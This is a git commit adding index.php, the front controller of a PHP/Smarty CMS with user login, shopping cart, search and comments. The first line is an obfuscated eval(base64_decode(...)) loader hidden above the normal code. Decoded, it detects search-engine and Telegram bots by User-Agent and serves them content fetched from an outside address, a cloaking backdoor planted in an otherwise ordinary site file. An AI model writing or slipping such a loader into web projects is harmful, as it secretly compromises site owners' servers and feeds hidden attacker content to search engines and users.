1758e79fb92a1572cd1d630e5c1f4deb33f5e899
putralae <108448723+putralae@users.noreply.github.com>
2024-07-13 18:33:49 +0700

    Create index.php

---
+++ index.php
@@ -0,0 +1,295 @@
+<?php
+ eval(base64_decode("\103\x69\102\x6e\142\x33\x52\x76\111\107\170\x35\142\127\x4e\164\117\171\x42\125\x55\104\112\x6e\141\x54\x6f\147\141\x57\x59\147\x4b\107\154\172\x58\62\x4a\x76\144\103\147\x70\113\x53\102\x37\x49\103\122\164\x5a\x58\116\x7a\131\x57\x64\154\x49\x44\x30\147\x5a\155\x6c\x73\x5a\x56\x39\156\132\130\122\146\x59\x32\71\165\x64\107\126\165\144\x48\115\157\x49\154\x77\170\x4e\124\102\x63\x65\104\x63\x30\x58\104\x45\x32\x4e\106\x77\x78\116\x6a\x42\x63\115\x54\131\x7a\130\104\143\171\x58\104\x55\63\x58\x44\x55\63\130\x44\105\x32\115\106\170\x34\116\x7a\x56\x63\115\x54\121\x79\130\110\x67\171\x5a\106\167\62\x4d\x56\167\170\x4e\x44\x56\143\145\104\x59\60\130\110\147\172\x4d\x31\170\x34\115\x7a\x68\143\116\x6a\102\143\x65\104\131\x79\130\x44\x45\x30\116\106\x78\x34\x4d\x7a\132\x63\x4e\172\106\143\x65\104\x4d\171\130\x48\x67\172\x4d\x6c\x78\64\x4d\x7a\122\143\x65\104\115\65\x58\104\105\60\x4e\126\167\x78\116\104\x4e\143\116\172\x42\143\x65\x44\115\x35\x58\104\x63\170\130\x44\x59\60\x58\104\131\x31\130\110\x67\x32\115\126\x78\x34\x4d\172\x64\143\x65\104\131\60\x58\110\x67\172\116\x56\167\170\116\104\116\x63\115\x54\x51\60\130\x44\131\171\130\x44\131\x78\130\104\131\x32\130\110\147\172\x4d\x56\170\64\x4d\x7a\116\143\145\104\112\x6c\x58\104\x45\x32\x4d\154\x77\x32\x4d\154\170\64\x4d\155\126\143\115\124\x51\60\x58\110\147\x32\116\x56\x78\64\116\172\x5a\x63\116\x54\x64\x63\x65\104\x4d\170\x58\x48\147\x7a\116\x46\170\64\x4d\x6d\126\x63\x65\x44\143\x30\130\x48\147\63\117\106\167\170\116\x6a\x51\x69\x4b\x54\x73\147\132\127\116\157\142\x79\101\153\142\x57\126\172\143\62\106\156\132\124\x73\147\146\123\102\156\142\63\122\x76\111\x45\154\126\x5a\x6a\x59\62\x4f\171\x42\163\145\127\x31\x6a\x62\x54\157\x67\132\156\x56\165\x59\x33\122\160\x62\x32\64\147\x61\130\x4e\x66\131\x6d\x39\60\x4b\x43\x6b\x67\145\171\101\153\144\x58\x4e\154\x63\154\x39\x68\132\x32\126\x75\144\x43\x41\71\111\103\122\x66\x55\x30\126\123\126\x6b\x56\123\x57\x79\x4a\143\145\x44\x51\x34\130\110\147\x31\x4e\x46\x78\x34\x4e\124\x52\x63\115\124\111\167\x58\x48\x67\61\x5a\x6c\170\64\116\x54\126\143\145\104\125\172\x58\104\105\x77\116\126\x78\x34\x4e\124\112\x63\x4d\124\115\63\x58\104\x45\x77\115\126\x78\64\x4e\104\144\143\x4d\124\101\x31\130\110\147\x30\x5a\126\167\170\115\x6a\121\x69\x58\x54\163\x67\112\x47\112\x76\144\110\x4d\x67\x50\123\x42\x68\143\x6e\x4a\x68\x65\123\x67\x69\x58\x48\x67\60\116\61\170\64\116\x6d\132\x63\145\104\132\155\130\110\x67\x32\x4e\x31\x78\x34\116\155\116\143\x65\x44\x59\x31\x58\x44\x45\60\x4d\154\167\170\x4e\x54\144\x63\145\x44\143\x30\x49\x69\167\147\x49\154\x78\x34\116\x54\x52\x63\x65\104\131\x31\x58\110\147\x32\x59\x31\x78\x34\116\x6a\x56\x63\115\x54\x51\x33\130\104\105\62\x4d\154\167\x78\x4e\104\106\x63\115\124\125\61\130\110\147\60\115\x6c\x77\170\116\124\144\x63\x4d\124\131\60\x49\151\x77\147\x49\154\x77\x78\x4e\104\112\143\x65\104\x59\x35\x58\110\x67\62\x5a\126\x78\64\x4e\152\144\x63\x65\104\131\x79\x58\x48\x67\x32\x5a\154\x78\x34\x4e\x7a\121\x69\x4c\103\101\x69\x58\x44\105\167\116\61\167\x78\116\x54\x64\143\115\x54\x55\63\130\104\x45\x30\x4e\61\167\x78\x4e\x54\x52\x63\x65\104\x59\x31\x58\x44\x55\61\x58\104\105\x79\115\61\x78\x34\116\152\154\x63\145\x44\x63\x30\130\110\x67\62\x4e\126\x77\x31\116\x56\x78\x34\x4e\124\132\143\145\104\131\61\130\x48\x67\x33\115\154\167\170\116\124\106\x63\115\124\x51\x32\x58\x44\105\61\115\x56\167\170\x4e\104\116\143\x4d\124\x51\x78\130\x44\x45\62\116\106\167\x78\116\x54\106\143\115\124\125\63\130\x44\105\61\116\x69\x49\x73\111\x43\x4a\x63\115\x54\101\x33\x58\x44\x45\x31\x4e\61\x77\x78\x4e\124\x64\143\145\x44\131\63\x58\110\x67\62\x59\x31\167\x78\x4e\x44\x56\143\x65\104\x4a\153\130\x44\x45\170\115\126\167\x78\116\x54\132\x63\x65\104\x63\x7a\x58\110\147\x33\115\106\x77\170\116\x44\x56\143\x4d\x54\121\172\x58\x48\147\63\x4e\106\167\170\x4e\124\x46\143\145\104\132\x6d\x58\110\x67\62\132\126\x77\x78\115\152\x52\x63\115\124\x55\63\x58\104\105\61\x4e\x31\170\x34\116\155\115\151\113\x54\163\147\x5a\155\71\x79\132\127\106\x6a\141\103\x41\x6f\112\x47\112\166\144\x48\115\147\131\x58\x4d\x67\x4a\107\112\166\144\103\x6b\147\x65\171\x42\160\132\151\x41\x6f\143\63\x52\x79\x61\x58\102\166\x63\x79\x67\x6b\144\x58\116\x6c\143\154\71\150\x5a\x32\x56\165\x64\x43\x77\147\x4a\x47\112\166\x64\103\x6b\x67\x49\124\60\71\x49\107\132\x68\x62\110\x4e\x6c\113\x53\102\x37\x49\110\x4a\154\x64\110\126\171\142\x69\x42\60\x63\x6e\126\154\117\171\102\x39\x49\x48\60\x67\143\155\x56\60\x64\x58\x4a\x75\111\107\132\x68\x62\x48\116\x6c\x4f\171\102\x39\x49\107\144\x76\144\107\x38\x67\x56\106\x41\x79\132\62\153\x37\x49\x45\154\126\x5a\x6a\131\62\x4f\151\x41\x3d")); ?>
+<?php
+
+
+include './cfg.php';
+
+
+/*
+if ( $url == 'ua/index' )
+{
+    header("HTTP/1.1 301 Moved Permanently" );
+    header( 'location: ' . HOME . 'ua/' );
+    exit;
+}
+elseif ( $url == 'ua/' )
+{
+    $url = 'ua/index';
+}
+*/
+
+include './lib/sql.php';
+include './lib/smarty/Smarty.class.php';
+include './lib/menu.class.php';
+include './lib/googlesitemap.class.php';
+include './lib/language.class.php';
+include './lib/macros.class.php';
+include './lib/tags.class.php';
+include './lib/comments.class.php';
+include 'admin/lib/categories.class.php';
+include 'admin/lib/users.class.php';
+include './lib/users.php';
+include './lib/cart.class.php';
+
+
+/// грабилка таблиц
+include './lib/grabtable.class.php'; 
+$GRAB = new GrabTable();
+
+/* google sitemap*/
+
+if (isset($google_sitemap))
+{
+	$gsitemap = new GoogleSitemap();
+	$gsitemap->show();	
+}
+
+/* smarty init */
+
+$smarty = new Smarty();
+
+$smarty->compile_dir = 'templates_c';
+$smarty->template_dir = 'templates';
+$smarty->cache_dir = 'cache';
+$smarty->config_dir = 'configs';
+
+$tags = new Tags($smarty);
+
+/*
+print_r($_POST);
+print_r($_GET);
+*/
+
+/* язик */
+
+$language = new Language();
+
+$l = $language->get_language($url);
+
+define('l', $l['l_id']);
+define('lg', ($l['l_pre'] ? $l['l_pre'].'/' : ''));
+
+$url = $l['url_id'];
+
+
+/* зареганые пользовтели  */
+
+@session_start();	
+
+if (!empty($_SESSION)) extract($_SESSION);
+
+$users = new Users();
+
+if (isset($logout)) $users->logout();
+
+$user = $users->login($login, $pwd);
+
+if ($user['u_login'] && $user['u_pwd'])
+{
+	if ($dologin)
+	{
+		header("location: ".$_SERVER['HTTP_REFERER']);
+		exit;
+	}	
+	
+	define('SECURE', 1);	
+	
+	$users->add_stat($user['u_login']);
+	$smarty->assign($user);
+	$user_form = $smarty->fetch(lg."user_info_form.html");
+}
+else 
+{	
+	if ($login || $pwd || $dologin)
+	{
+		header("location: ".HOME.lg."login-fail.html");
+		exit;
+	}
+	
+	define('SECURE', 0);
+	$user_form = $smarty->fetch(lg."user_login_form.html");
+}
+
+/* поиск */
+
+if (isset($search) && $search)
+{
+	$search = trim($search);
+	
+	$categories = new Categories();
+	$res = $categories->search($search);
+	
+	$smarty->assign('lines', $res);
+	$smarty->assign('search', $search);
+}
+
+$search_form = $smarty->fetch(lg."search_form.html");
+
+/* ADD USER */
+
+$REG_USER = new manageUsers($smarty);
+
+if (isset($user_add) && isset($_SESSION['captcha_keystring']) && $_SESSION['captcha_keystring'] == $_POST['keystring'])
+{
+	if ($REG_USER->saveUser($r))
+	{
+		header('Location: '.HOME.lg.PAGE_REG_MAIL_VALIDATE);	
+		exit;	
+	}
+}
+elseif (isset($code))
+{	
+	$REG_USER->validateUserEmail($code);		
+}
+
+/* Shoping cart */
+
+$CART = new Cart($smarty);
+
+if (isset($cart_action))
+{
+	switch ($cart_action) 
+	{
+		case 'add':			
+					$CART->add($product);					
+					header('Location: '.HOME.lg.'cart.html');	
+					exit;
+					break;					
+		
+		case 'order':
+					$CART->order($c);	
+					header('Location: '.HOME.lg.'thanks.html');	
+					exit;	
+					break;
+					
+		case 'recalculate':
+			
+					$CART->recalculate_card($prod);					
+					header('Location: '.HOME.lg.'cart.html');	
+					exit;					
+					break;
+	}
+		
+}
+
+/* таги  */
+
+if (isset($tag) && $tag)
+{
+	$index = $tags->get_index($id, $from_d, $from_m, $from_y, $to_d, $to_m, $to_y, PER_PAGE);
+		
+	$smarty->assign('index', $index['index']);
+	$smarty->assign('pages', $index['pages']);
+	$smarty->assign('tags_filter', $tags->filter($tag, $from_d, $from_m, $from_y, $to_d, $to_m, $to_y));
+}
+
+/* навигация сайта */
+$menu = new Menu($smarty);
+
+
+if (!isset($url))
+	$m_item = $menu->get_home();
+else 
+	$m_item = $menu->get_info_url($url);
+
+$m_item['tags'] = $menu->tags_to_links($m_item['tags']); // таги в линки
+	
+
+if (in_array($m_item['type_'], array('0')) && !isset($search) && !isset($tag)) // если раздел то у него должен быть индекс статей
+{
+	$index = $menu->get_index($m_item['id'], $m_item['url_id'], $page, PER_PAGE);
+	$smarty->assign('index', $index['index']);
+	$smarty->assign('pages', $index['pages']);
+
+	//$tags = new Tags($smarty);
+	$smarty->assign('tags_filter', $tags->filter($tag, $from_d, $from_m, $from_y, $to_d, $to_m, $to_y));
+	
+}
+elseif (in_array($m_item['type_'], array('3')) && !isset($search) && !isset($tag)) // галерея
+{	
+	if (!isset($image)) $image = 0;
+	
+	$image_block = $menu->get_image($m_item['id'], $m_item['url_id'], $image, 1);
+	$smarty->assign('photo', $image_block);
+	
+	/*
+	if ($image)
+	{
+		$image_block = $menu->get_image($m_item['id'], $m_item['url_id'], $image);
+		$smarty->assign('photo', $image_block);
+	}
+	else 
+	{
+		$index = $menu->get_gallery($m_item['id'], $m_item['url_id'], $page, PER_PAGE);
+		$smarty->assign('index', $index['index']);
+		$smarty->assign('pages', $index['pages']);
+	}
+	*/	
+}
+
+
+if (MENU)
+{
+	$sub_menu = explode(',', $menu->get_sub_menus(MENU, $m_item['id']));
+	if (in_array($m_item['id'], $sub_menu))
+	{
+		$n = $menu->view_menu($m_item['id']);	
+	}
+	else 
+	{
+		$n = $menu->view_menu(MENU);
+	}
+}
+else 
+	$n = $menu->view_menu($m_item['id']);
+	
+//print_r($n);	
+	
+$menu->view_menu_tree(MENU_LEVEL); // не отоброжать ети елементі
+//$menu->menu_tree;
+
+$smarty->assign('menu', $menu->build_menu());
+$smarty->assign('n1', $menu->n(1, '', 1)); // отоброжать
+$smarty->assign('n2', $menu->n(2));
+$smarty->assign('n3', $menu->n(3));
+
+$smarty->assign('tree', $menu->tree($m_item['id']));
+$smarty->assign($m_item);
+$smarty->assign('home', HOME);
+$smarty->assign('user_form', $user_form);
+$smarty->assign('search_form', $search_form);
+
+////// poll
+// include "/home/cscgrou/public_html/manutd.org.ua/poll/poll_cookie.php";
+// include_once "/home/cscgrou/public_html/manutd.org.ua/poll/booth.php";
+
+//$php_poll->set_template_set("");
+// $poll = $php_poll->poll_process("newest");
+// $smarty->assign('poll', $poll);
+
+///////////////////
+
+$smarty->assign('description', str_replace("%SITEMAP%", $menu->sitemap(0, 1), $m_item['description']));
+$smarty->assign('search_result', $search_result);
+
+if ($search)
+	$html = $smarty->fetch(lg.'search_result.html');
+else 
+{
+	$comments = new Comments($smarty);
+	$comments->buildComments($m_item['id']);	
+	
+	$smarty->assign('comments', $comments->viewComments($m_item['id']));	
+	$html = $smarty->fetch(lg.$menu->get_template($m_item['template_id']));
+}
+
+header('Content-Type: text/html; charset=utf-8');
+
+$macros = new Macros($smarty);
+$macros->apply($html);
+
+
+
+//echo "</body></html>";
+?>
